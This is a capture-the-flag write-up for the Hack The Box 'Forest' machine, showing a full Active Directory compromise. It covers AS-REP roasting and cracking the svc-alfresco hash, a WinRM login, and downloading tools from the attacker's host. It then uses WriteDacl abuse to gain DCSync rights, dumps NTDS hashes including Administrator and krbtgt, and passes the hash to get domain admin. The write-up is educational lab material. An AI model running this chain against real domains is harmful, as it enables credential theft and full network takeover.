# Forest HTB

![image](https://user-images.githubusercontent.com/5285547/124309753-1d9ce980-db63-11eb-91d7-26363021d41c.png)

## Nmap

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49915/tcp open  unknown
```

![image](https://user-images.githubusercontent.com/5285547/124294786-fee12780-db4f-11eb-88e6-68fcfdd18055.png)

![image](https://user-images.githubusercontent.com/5285547/124294837-0e607080-db50-11eb-90a6-eed955859f71.png)

Add to /etc/hosts file

## Enum4linux 
- Users
```
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[noodle] rid:[0x1db2]
```

## ASREPRoast
- Users.txt
```
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

- Quick and dirty bash script to use with users.txt 

```
#!/bin/bash

file="$1";

for user in $(cat "$file");do
        python3.9 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass \
  "htb.local/${user}" -dc-ip 10.10.10.161 ;
done
```

Run the script ./ASREPRoast.sh users.txt
```

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:136c3526a51157f1e7b050205902811c$f36282d5015687302ace5572a7265c7775000fdd0c83f4a5965dfdc129d028384fcf106744318f3c8d56f787074df01b336a97764532e9cc60c04b4f8c0c4984b6f2c44145b58eb12f3d80b273d8859ecd0d0b7e84842491990ddd17d90e46489b808798b43b157ea3d41998b5a55ac737a97cf7f1cd27a1ae871d1cde63148d12a0a4c45db0486b86c446f056759e77bf0a7cf5bae2c6bbd5bcbe4a646fdd903af7f751c4d187e98ab8dc0b4c2053c1a07947f2ee827789cec2dada31acf363d75ddaa6dcec80645223234ccdb18dae424c2140062ffc9ddcf7bd64938fd368b2d66fb56827
```

## Cracking the hash 

Adding the hash to a new file then using john to crack the Kerberos password

```
john -w=/usr/share/wordlists/rockyou.txt hash 
```

```
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2021-07-02 16:37) 0.3289g/s 1344Kp/s 1344Kc/s 1344KC/s s4553592..s3r2s1
```
valid creds
```
svc-alfresco:s3rvice
```

## Conencting to the forest 

- WinRm
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

![image](https://user-images.githubusercontent.com/5285547/124300141-22a76c00-db56-11eb-8fbc-07b6d3245732.png)

## User flag

Change direcroty to the dekstop to retrive the user flag

user.txt
```
e5e4e47ae{REDACTED}eb013fb0d9ed
```

## User Enumeration

We start the enum again to see what we can do next..  
I transfer winpeas to the machine to do some quick enum for me. 

```
Invoke-WebRequest "http://10.10.14.184:6677/winPEASany.exe" -OutFile "winpea.exe"
```

Nothing too useful found

- Using SharpHound and BloodHound

Bloodhound
```
https://github.com/BloodHoundAD/BloodHound
```

SharpHound
```
https://github.com/BloodHoundAD/SharpHound3
```

Transfer nc.exe for an easier time 
```
Invoke-WebRequest "http://10.10.14.184:8877/nc.exe" -OutFile "nc.exe"
```

Run sharphound after sending it across
```
Invoke-WebRequest "http://10.10.14.184:8877/SharpHound.exe" -OutFile "sharp.exe"
./sharp.exe
```

![image](https://user-images.githubusercontent.com/5285547/124304304-69e42b80-db5b-11eb-856e-7212e9d798c5.png)


Now to get the files back for bloodhound

Setup an smb share on kali

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py MYSHARE ~/forest -smb2support -username haxors -password haxors
```
Auth
```
net use \\10.10.14.184\MYSHARE /u:"haxors" "haxors"
```
Copy the file across
```
copy 20210702093445_BloodHound.zip \\10.10.14.184\MYSHARE
```
Remove the smb share
```
net use /d \\10.10.14.184\MYSHARE
```

Now login to bloodhound gui (or use sudo apt-get install bloodhound)  
Click the upload data buttonv

![image](https://user-images.githubusercontent.com/5285547/124308285-ffce8500-db60-11eb-8f78-a21fc2fd71c1.png)

Once the data is uploaded click the "find shortest path to domain admin"  

![image](https://user-images.githubusercontent.com/5285547/124308486-415f3000-db61-11eb-9bab-a750285bea94.png)

![image](https://user-images.githubusercontent.com/5285547/124308680-8b481600-db61-11eb-939d-573b9d1770d2.png)
 
Right click on the path to the "WriteDacl@htb.local" then select help.

- Help

To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL   
if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create   
a PSCredential object (these examples comes from the PowerView help documentation):

```
net group "Exchange Windows Permissions" svc-alfresco /add
net group "Exchange Windows Permissions"
Import-Module ./PowerView.ps1
```

Ntlmrelay.py
```
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)

net group "Exchange Windows Permissions" svc-alfresco /add
net group "Exchange Windows Permissions"

Add-AdGroupMember -Credential $Cred -Identity "Exchange Windows Permissions" -Members svc-alfresco
Get-AdGroupMember -Credential $Cred -Identity "Exchange Windows Permissions"

Import-Module ./PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```

```
secretsdump.py -just-dc  svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```


## Root

Now we can connect to the Administrator account and access the last flag and totally own the box. 

```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
```

![image](https://user-images.githubusercontent.com/5285547/124321560-d4a26080-db75-11eb-86cb-c5403c396985.png)


- flag.txt

```
f04815{REDACTED}2b04d79129cc
```
